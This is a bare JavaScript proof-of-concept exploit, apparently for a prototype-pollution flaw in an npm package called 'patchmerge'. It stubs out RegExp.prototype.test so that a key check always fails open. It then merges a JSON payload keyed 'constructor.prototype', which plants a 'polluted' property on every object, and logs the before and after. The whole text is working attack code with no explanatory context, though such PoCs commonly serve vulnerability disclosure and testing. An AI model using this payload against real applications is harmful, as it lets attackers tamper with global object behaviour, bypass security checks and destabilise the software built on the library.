RegExp.prototype.test = () => false;
var patchMerge = require('patchmerge');
var obj = {};
console.log({}.polluted);
patchMerge(obj, JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);